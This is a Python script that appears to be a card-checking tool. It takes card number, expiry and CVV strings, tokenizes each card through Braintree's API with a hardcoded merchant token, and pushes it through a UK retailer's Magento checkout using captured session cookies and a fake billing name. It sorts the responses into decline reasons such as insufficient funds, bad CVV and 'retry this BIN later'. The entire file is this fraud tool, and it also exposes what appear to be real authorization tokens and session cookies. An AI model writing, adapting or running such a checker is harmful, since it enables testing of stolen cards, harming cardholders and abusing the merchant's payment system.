import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk4NzQ1MjUsImp0aSI6ImM3ODRhZjBiLTk1MzUtNGE3My1hNmY1LTVmNDZmMmYxYjY5ZSIsInN1YiI6ImJxY3h0bjZ4eWZycWJzd3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImJxY3h0bjZ4eWZycWJzd3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.2b3JS8B6_KfI2fmH77UfRu7D57-iK2ThifBnCVLo0b5xcT-lbOheRtmA-TCW11IPZEy9auqojfn6Ae98QxveLg',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e97ac3a9-51ae-44f9-a4f0-2dfb74cd46ea',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']

	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://www.cytoplan.co.uk',
	    'referer': 'https://www.cytoplan.co.uk/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '14.40',
	    'additionalInfo': {
	        'billingLine1': 'Flat 2, 14A',
	        'billingLine2': 'London Road',
	        'billingCity': 'Brighton',
	        'billingPostalCode': 'BN1 4JA',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '+445165554433',
	        'billingGivenName': '\\u0068\\u0072\\u0068\\u0072\\u0068\\u0064',
	        'billingSurname': '\\u0068\\u0068\\u0064\\u0068\\u0064\\u0068\\u0064',
	    },
	    'challengeRequested': True,
	    'bin': '424242',
	    'dfReferenceId': '0_545090e6-8fe4-495b-be8a-ce406f660d49',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.94.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 13,
	        'issuerDeviceDataCollectionTimeElapsed': 2931,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk4NzQ1MjUsImp0aSI6ImM3ODRhZjBiLTk1MzUtNGE3My1hNmY1LTVmNDZmMmYxYjY5ZSIsInN1YiI6ImJxY3h0bjZ4eWZycWJzd3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImJxY3h0bjZ4eWZycWJzd3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.2b3JS8B6_KfI2fmH77UfRu7D57-iK2ThifBnCVLo0b5xcT-lbOheRtmA-TCW11IPZEy9auqojfn6Ae98QxveLg',
	    'braintreeLibraryVersion': 'braintree/web/3.94.0',
	    '_meta': {
	        'merchantAppId': 'www.cytoplan.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.94.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'e97ac3a9-51ae-44f9-a4f0-2dfb74cd46ea',
	    },
	}
	
	response4 = requests.post(
	    f'https://api.braintreegateway.com/merchants/bqcxtn6xyfrqbsww/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

	nonce = response4.json()['paymentMethod']['nonce']

	cookies = {
	    '__adroll_fpc': '13a19376a504e9156dd91b0e69385b04-1728728244253',
	    '_fbp': 'fb.2.1728728244600.396984249207616381',
	    'recordID': '886df073-d0b8-4e6f-9777-8d5ed2efaaf1',
	    'amcookie_policy_restriction': 'denied',
	    'cookiefirst-consent': '%7B%22necessary%22%3Atrue%2C%22performance%22%3Atrue%2C%22functional%22%3Atrue%2C%22advertising%22%3Atrue%2C%22timestamp%22%3A1728728251%2C%22type%22%3A%22category%22%2C%22version%22%3A%226194f0e0-bd50-4925-a389-f80ee4a5d4b4%22%7D',
	    '_gcl_au': '1.1.1760181624.1728728251',
	    '_ga': 'GA1.1.41770599.1728728244',
	    'smc_tag': 'eyJpZCI6NjY2OCwibmFtZSI6ImN5dG9wbGFuLmNvLnVrIn0%3D',
	    'smc_not': 'default',
	    'smc_uid': '1728296059420584',
	    'form_key': 'xtg1y5OlKg7rGEIN',
	    'mage-cache-storage': '{}',
	    'mage-cache-storage-section-invalidation': '{}',
	    'mage-banners-cache-storage': '{}',
	    '_clck': 'p967pl%7C2%7Cfqa%7C0%7C1746',
	    'mage-messages': '',
	    'recently_viewed_product': '{}',
	    'recently_viewed_product_previous': '{}',
	    'recently_compared_product': '{}',
	    'recently_compared_product_previous': '{}',
	    'product_data_storage': '{}',
	    'dmSessionID': 'b6503778-4a22-4bc4-8ee9-55566d194af8',
	    'magepal-google-analytics4': '{}',
	    'magepal-enhanced-ecommerce': '{}',
	    'slidingcart_show_cart': '0',
	    'smc_session_id': '8M1wooRp6kXb0pZE7p4Y7L2ZLxDEncOo',
	    'smct_dyn_BasketCount': '1',
	    'smc_sesn': '5',
	    'dataservices_customer_id': '%22322694%22',
	    'dataservices_customer_group': '%7B%22customerGroupCode%22%3A%22356a192b7913b04c54574d18c28d46e6395428ab%22%7D',
	    'dataservices_cart_id': '%222602729%22',
	    'form_key': 'xtg1y5OlKg7rGEIN',
	    'X-Magento-Vary': 'd4781023cb8914348034d11241de98ca665efda8faf6977f71120c4c0b70053c',
	    'mage-cache-sessid': 'true',
	    'authentication_flag': 'false',
	    'smc_tpv': '8',
	    'smc_spv': '2',
	    'smct_dyn_BasketValue': '9.9',
	    'smct_last_ov': '%5B%7B%22id%22%3A131179%2C%22loaded%22%3A1729791341451%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%2C%7B%22id%22%3A131173%2C%22loaded%22%3A1729791337280%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%2C%7B%22id%22%3A131179%2C%22loaded%22%3A1729791334619%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%5D',
	    'smct_session': '%7B%22s%22%3A1729791304131%2C%22l%22%3A1729791343918%2C%22lt%22%3A1729791343924%2C%22t%22%3A11%2C%22p%22%3A11%7D',
	    'aw_popup_viewed_page': '%5B%229a4aedf0b3ce65c89cb6b76a8f5683bdefcdb2f3fb23521915f156d26ec731f8%22%2C%224303a00ddc4dbfc4feae575c5c78a5075decb4fa8c33d02326db1e146cb08d3b%22%2C%22bb700236786eb4101f3aa391235a40af2653b422cf0597830ff250303f0f40ec%22%2C%22def8467b758b333cf0c51eb60c630dc1cb445c7eb8a92c5b9983a8d637e19e67%22%5D',
	    'amzn-checkout-session': '{}',
	    'PHPSESSID': 'pisagp9q5kmd3rjejsvdcg5cob',
	    '_uetsid': '2a74ddb0922c11ef8e31a524b7b944ff',
	    '_uetvid': '2c571cd0888311efb2755fedcd1711af',
	    '__ar_v4': 'YGASMLKD7VFZDMIEXQATCK%3A20241011%3A53%7CYCEMYUSQ5JBDNGM5KOI47O%3A20241011%3A53',
	    'requestId': 'd2c38685-3dc0-408d-b7ca-201245e9396e',
	    '_clsk': 'fq3otv%7C1729791688346%7C18%7C1%7Ci.clarity.ms%2Fcollect',
	    'private_content_version': 'd1cb599a2c4ecff24d7dfe88caac3ab8',
	    '_ga_Z5ZXZNWPF9': 'GS1.1.1729790390.9.1.1729791736.14.0.0',
	    'section_data_ids': '{%22apptrian_metapixelapi_matching_section%22:1729788176%2C%22cart%22:1729788176%2C%22directory-data%22:1729787774%2C%22ammessages%22:1729788176%2C%22magepal-gtm-jsdatalayer%22:1729788176%2C%22magepal-eegtm-jsdatalayer%22:1729787784%2C%22customer%22:1729787774%2C%22compare-products%22:1729787774%2C%22last-ordered-items%22:1729788176%2C%22captcha%22:1729788176%2C%22wishlist%22:1729787774%2C%22loggedAsCustomer%22:1729787774%2C%22multiplewishlist%22:1729787774%2C%22persistent%22:1729788132%2C%22review%22:1729787774%2C%22webforms%22:1729787774%2C%22recently_viewed_product%22:1729787774%2C%22recently_compared_product%22:1729787774%2C%22product_data_storage%22:1729787774%2C%22paypal-billing-agreement%22:1729787774}',
	}
	
	headers = {
	    'authority': 'www.cytoplan.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    # 'cookie': '__adroll_fpc=13a19376a504e9156dd91b0e69385b04-1728728244253; _fbp=fb.2.1728728244600.396984249207616381; recordID=886df073-d0b8-4e6f-9777-8d5ed2efaaf1; amcookie_policy_restriction=denied; cookiefirst-consent=%7B%22necessary%22%3Atrue%2C%22performance%22%3Atrue%2C%22functional%22%3Atrue%2C%22advertising%22%3Atrue%2C%22timestamp%22%3A1728728251%2C%22type%22%3A%22category%22%2C%22version%22%3A%226194f0e0-bd50-4925-a389-f80ee4a5d4b4%22%7D; _gcl_au=1.1.1760181624.1728728251; _ga=GA1.1.41770599.1728728244; smc_tag=eyJpZCI6NjY2OCwibmFtZSI6ImN5dG9wbGFuLmNvLnVrIn0%3D; smc_not=default; smc_uid=1728296059420584; form_key=xtg1y5OlKg7rGEIN; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-banners-cache-storage={}; _clck=p967pl%7C2%7Cfqa%7C0%7C1746; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; dmSessionID=b6503778-4a22-4bc4-8ee9-55566d194af8; magepal-google-analytics4={}; magepal-enhanced-ecommerce={}; slidingcart_show_cart=0; smc_session_id=8M1wooRp6kXb0pZE7p4Y7L2ZLxDEncOo; smct_dyn_BasketCount=1; smc_sesn=5; dataservices_customer_id=%22322694%22; dataservices_customer_group=%7B%22customerGroupCode%22%3A%22356a192b7913b04c54574d18c28d46e6395428ab%22%7D; dataservices_cart_id=%222602729%22; form_key=xtg1y5OlKg7rGEIN; X-Magento-Vary=d4781023cb8914348034d11241de98ca665efda8faf6977f71120c4c0b70053c; mage-cache-sessid=true; authentication_flag=false; smc_tpv=8; smc_spv=2; smct_dyn_BasketValue=9.9; smct_last_ov=%5B%7B%22id%22%3A131179%2C%22loaded%22%3A1729791341451%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%2C%7B%22id%22%3A131173%2C%22loaded%22%3A1729791337280%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%2C%7B%22id%22%3A131179%2C%22loaded%22%3A1729791334619%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%5D; smct_session=%7B%22s%22%3A1729791304131%2C%22l%22%3A1729791343918%2C%22lt%22%3A1729791343924%2C%22t%22%3A11%2C%22p%22%3A11%7D; aw_popup_viewed_page=%5B%229a4aedf0b3ce65c89cb6b76a8f5683bdefcdb2f3fb23521915f156d26ec731f8%22%2C%224303a00ddc4dbfc4feae575c5c78a5075decb4fa8c33d02326db1e146cb08d3b%22%2C%22bb700236786eb4101f3aa391235a40af2653b422cf0597830ff250303f0f40ec%22%2C%22def8467b758b333cf0c51eb60c630dc1cb445c7eb8a92c5b9983a8d637e19e67%22%5D; amzn-checkout-session={}; PHPSESSID=pisagp9q5kmd3rjejsvdcg5cob; _uetsid=2a74ddb0922c11ef8e31a524b7b944ff; _uetvid=2c571cd0888311efb2755fedcd1711af; __ar_v4=YGASMLKD7VFZDMIEXQATCK%3A20241011%3A53%7CYCEMYUSQ5JBDNGM5KOI47O%3A20241011%3A53; requestId=d2c38685-3dc0-408d-b7ca-201245e9396e; _clsk=fq3otv%7C1729791688346%7C18%7C1%7Ci.clarity.ms%2Fcollect; private_content_version=d1cb599a2c4ecff24d7dfe88caac3ab8; _ga_Z5ZXZNWPF9=GS1.1.1729790390.9.1.1729791736.14.0.0; section_data_ids={%22apptrian_metapixelapi_matching_section%22:1729788176%2C%22cart%22:1729788176%2C%22directory-data%22:1729787774%2C%22ammessages%22:1729788176%2C%22magepal-gtm-jsdatalayer%22:1729788176%2C%22magepal-eegtm-jsdatalayer%22:1729787784%2C%22customer%22:1729787774%2C%22compare-products%22:1729787774%2C%22last-ordered-items%22:1729788176%2C%22captcha%22:1729788176%2C%22wishlist%22:1729787774%2C%22loggedAsCustomer%22:1729787774%2C%22multiplewishlist%22:1729787774%2C%22persistent%22:1729788132%2C%22review%22:1729787774%2C%22webforms%22:1729787774%2C%22recently_viewed_product%22:1729787774%2C%22recently_compared_product%22:1729787774%2C%22product_data_storage%22:1729787774%2C%22paypal-billing-agreement%22:1729787774}',
	    'origin': 'https://www.cytoplan.co.uk',
	    'referer': 'https://www.cytoplan.co.uk/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'cartId': '2602741',
	    'billingAddress': {
	        'customerAddressId': '396488',
	        'countryId': 'GB',
	        'region': 'East Sussex',
	        'customerId': '322694',
	        'street': [
	            'Flat 2, 14A',
	            'London Road',
	        ],
	        'company': None,
	        'telephone': '+445165554433',
	        'fax': None,
	        'postcode': 'BN1 4JA',
	        'city': 'Brighton',
	        'firstname': 'hrhrhd',
	        'lastname': 'hhdhdhd',
	        'middlename': None,
	        'prefix': None,
	        'suffix': None,
	        'vatId': None,
	        'customAttributes': [],
	        'saveInAddressBook': None,
	    },
	    'paymentMethod': {
	        'method': 'braintree',
	        'additional_data': {
	            'payment_method_nonce': nonce,
	            'device_data': '{"correlation_id":"dbed9d17544e3018b70140dff0f10b38"}',
	            'is_active_payment_token_enabler': False,
	            'amgdpr_agreement': '{}',
	        },
	    },
	}
	
	req0 = requests.post(
	    'https://www.cytoplan.co.uk/rest/default/V1/carts/mine/payment-information',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
)
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "three_d_secure" in req0.text:
		return "three_d_secure"		
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
